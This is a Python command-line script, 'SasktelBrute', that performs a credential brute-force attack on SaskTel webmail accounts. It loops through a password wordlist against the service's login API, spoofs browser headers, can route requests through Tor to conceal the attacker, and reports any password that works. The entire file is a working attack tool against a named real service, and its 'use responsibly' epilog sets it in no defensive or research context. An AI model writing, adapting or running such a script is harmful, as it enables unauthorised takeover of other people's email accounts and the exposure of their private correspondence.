import requests
import argparse
import time
import json


def parse_arguments():
    parser = argparse.ArgumentParser(
        prog='SasktelBrute',
        description='Bruteforce Sasktel Webmail',
        epilog='Use responsibly and ethically.')

    parser.add_argument('-w', '--wordlist', required=True, help="Password Wordlist")
    parser.add_argument('-u', '--user', type=str, required=True, help="Full username including @sasktel.net")
    parser.add_argument('-t', '--tor', action='store_true', help="use TOR during attack")
    args = parser.parse_args()

    with open(args.wordlist) as file:
        passwords = file.read().splitlines()

    user = args.user

    return user, passwords, args.tor


def create_tor_session():
    session = requests.session()
    tor_proxy = "socks5://127.0.0.1:9050"
    session.proxies = {'http': tor_proxy, 'https': tor_proxy}


    return session


def get_current_ip(session):
    try:
        response = session.get('http://httpbin.org/ip')
        return json.loads(response.text)['origin']
    except:
        return "Unknown IP"


def attack(user, password, use_tor=False):
    url = 'https://webmail.sasktel.net/api/bf/login/'

    headers = {
        'Host': 'webmail.sasktel.net',
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-CA,en-US;q=0.7,en;q=0.3;',
        'Accept-Encoding': 'gzip, deflate, br',
        'Referer': 'https://webmail.sasktel.net/',
        'Content-Type': 'application/json',
        'ADRUM': 'isAjax:true',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin'
    }

    data = {
        "SnapInfo": {
            "SnapEmailField": None,
            "SnapPassField": None,
            "SnapUrl": None,
            "SnapOn": "NO",
            "SnapShortEmailOn": None,
            "SnapRemoteAuth": "YES"
        },
        "user": user,
        "password": password
    }

    session = create_tor_session() if use_tor else requests.session()

    try:
        response = session.post(url, json=data, headers=headers, timeout=10)
        print(f"CODE: {response.status_code}")
        if response.status_code == 200:
            print(f">>>>>>>>> PASSWORD FOUND: {password}")
            return True
    except requests.RequestException as e:
        print(f"Error during request: {e}")
        return False

    return False


if __name__ == '__main__':
    user, passwords, use_tor = parse_arguments()

    # Determine IP and print it
    session_for_ip = create_tor_session() if use_tor else requests.session()
    current_ip = get_current_ip(session_for_ip)
    print(f"Using IP address: {current_ip}")

    print("Starting the attack...")

    for password in passwords:
        print(f"Trying password: {password}")
        if attack(user, password, use_tor):
            break
        time.sleep(2)

    print("Attack finished.")
